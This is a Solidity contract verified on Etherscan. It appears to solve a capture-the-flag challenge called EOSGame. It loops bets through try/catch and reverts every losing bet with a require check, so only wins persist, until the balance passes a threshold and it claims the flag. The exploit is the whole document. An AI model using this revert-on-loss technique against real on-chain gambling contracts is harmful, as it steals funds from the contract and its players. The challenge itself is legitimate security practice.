/**
 *Submitted for verification at Etherscan.io on 2022-08-17
*/

// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.12;



interface EOSGame{
    function initFund() external;
    function smallBlind() external;
    function bigBlind() external;
    function eosBlanceOf() external view returns(uint256);
    function CaptureTheFlag(string memory) external;
}
contract Bet {
    address constant eos = 0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F;
    function run() external {
        if (EOSGame(eos).eosBlanceOf() == 0) {
            EOSGame(eos).initFund();
        }
        for (uint it = 0; it < 1000; it += 1) {
            try this.win() {
            } catch{}
        }
        if (EOSGame(eos).eosBlanceOf() > 18888) {
            EOSGame(eos).CaptureTheFlag("dusmart");
        }
    }
    function win() external {
        uint256 balance = EOSGame(eos).eosBlanceOf();
        if (balance == 0) {
            EOSGame(eos).initFund();
        }
        if (balance > 19) {
            EOSGame(eos).bigBlind();
        } else {
            EOSGame(eos).smallBlind();
        }
        require(EOSGame(eos).eosBlanceOf() > balance, "do not accept the failure");
    }
    function winmulti() external {
        uint256 balance = EOSGame(eos).eosBlanceOf();
        if (balance == 0) {
            EOSGame(eos).initFund();
        }
        bool flag = balance > 500;
        for (int i = 0; i < 100; i++) {
            if (flag) {
                EOSGame(eos).bigBlind();
            } else {
                EOSGame(eos).smallBlind();
            }
        }
        require(EOSGame(eos).eosBlanceOf() > balance, "do not accept the failure");
    }
    function b() external view returns(uint256) {
        return EOSGame(eos).eosBlanceOf();
    }
}